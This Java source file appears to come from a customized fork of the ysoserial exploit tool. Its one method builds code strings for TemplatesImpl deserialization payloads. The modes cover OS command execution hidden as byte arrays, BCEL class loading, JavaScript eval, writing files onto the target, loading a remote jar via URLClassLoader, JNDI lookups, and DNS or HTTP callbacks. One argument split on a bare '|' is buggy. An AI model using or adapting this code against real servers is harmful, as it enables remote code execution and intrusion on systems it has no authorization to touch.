package ysoserial.payloads.custom;

import sun.misc.BASE64Decoder;
import ysoserial.payloads.util.CommonUtil;
import java.io.IOException;

import static ysoserial.payloads.custom.CustomCommand.*;

public class TemplatesImplUtil {
    public static String getCmd(String command) throws IOException {
        String cmd = null;
        if(command.toLowerCase().startsWith("sleep:")) {
            int time = Integer.valueOf(command.substring(6)) * 1000;
            cmd = String.format("java.lang.Thread.sleep(%sL);",time);
        } else if (command.toLowerCase().startsWith("dnslog:")){
            String dnslogDomain = command.substring(7);
            cmd = String.format("java.net.InetAddress.getAllByName(\"%s\");",dnslogDomain);
        } else if (command.toLowerCase().startsWith("httplog:")){
            String httplogURL = command.substring(8);
            cmd = String.format("new java.net.URL(\"%s\").getContent();",httplogURL);
        } else if (command.toLowerCase().startsWith("bcel:")) {
            String bcel = command.substring(5);
            cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();",bcel);
        } else if (command.toLowerCase().startsWith("bcel_class_file:")){
            String bcelClassFile = command.substring(16);
            String strBCEL = CommonUtil.classToBCEL(bcelClassFile);
            cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();",strBCEL);
        } else if(command.toLowerCase().startsWith("auto_cmd:")){
            /*
                String[] cmds = null;
                String osType = System.getProperty("os.name").toLowerCase();
                if(osType.contains("windows")){
                    cmds = new String[]{"cmd.exe","/c",strCmd};
                }else{
                    cmds = new String[]{"/bin/sh","-c",strCmd};
                }
                java.lang.Runtime.getRuntime().exec(cmds);
             */
            String strCmd = command.substring(9);
            String cmdByteArray = CommonUtil.stringToByteArrayString(strCmd);
            cmd = String.format("String[] cmds = null;\n" +
                "String osType = System.getProperty(\"os.name\").toLowerCase();\n" +
                "if(osType.contains(\"windows\")){\n" +
                "    cmds = new String[]{\"cmd.exe\",\"/c\",new java.lang.String(new byte[]{%s})};\n" +
                "}else{\n" +
                "    cmds = new String[]{\"/bin/sh\",\"-c\",new java.lang.String(new byte[]{%s})};\n" +
                "}\n" +
                "java.lang.Runtime.getRuntime().exec(cmds);",cmdByteArray,cmdByteArray);
        } else if(command.toLowerCase().startsWith(COMMAND_SCRIPT_FILE)){
            String scriptFilePath = command.substring(COMMAND_SCRIPT_FILE.length());
            String scriptFileByteCode = CommonUtil.byteToByteArrayString(CommonUtil.readFileByte(scriptFilePath));
            cmd = String.format("new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(new java.lang.String(new byte[]{%s}));",scriptFileByteCode);
        }else if (command.toLowerCase().startsWith(COMMAND_SCRIPT_BASE64)){
            // Rhino jdk6 ~ jdk7
            // nashorn jdk8
            String scriptContent = command.substring(COMMAND_SCRIPT_BASE64.length());
            scriptContent = new String(new BASE64Decoder().decodeBuffer(scriptContent));
            cmd = String.format("new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(new java.lang.String(new byte[]{%s}));",CommonUtil.stringToByteArrayString(scriptContent));
        } else if (command.toLowerCase().startsWith(COMMAND_UPLOADFILE)){
            String cmdInfo = command.substring(COMMAND_UPLOADFILE.length());
            String localFilePath = cmdInfo.split("\\|")[0];
            String remoteFilePath = cmdInfo.split("\\|")[1];
            String fileByteCode = CommonUtil.fileContextToByteArrayString(localFilePath);
            cmd = String.format("new java.io.FileOutputStream(\"%s\").write(new byte[]{%s});",remoteFilePath,fileByteCode);
        } else if (command.toLowerCase().contains(COMMAND_LOADJAR)){
            String cmdInfo = command.substring(COMMAND_LOADJAR.length());
            String jarpath = cmdInfo.split("\\|")[0];
            String className = cmdInfo.split("\\|")[1];
            String args = cmdInfo.split("|")[2];
            cmd = String.format("java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\"%s\")});" +
                "classLoader.loadClass(\"%s\").getConstructor(String.class).newInstance(\"%s\");",jarpath,className,args);
        } else if (command.toLowerCase().contains("jndi:")){
            String jndiURL = command.substring(5);
            cmd = String.format("new javax.naming.InitialContext().lookup(\"%s\");",jndiURL);
        } else {
            /* 转义方式转换命令在某些复杂命令下依然存在问题，改用byte/string转换方式*/
            /*cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
             */

            cmd = String.format("java.lang.Runtime.getRuntime().exec(new java.lang.String(new byte[]{%s}));",CommonUtil.stringToByteArray(command));
        }
        return cmd;
    }
}
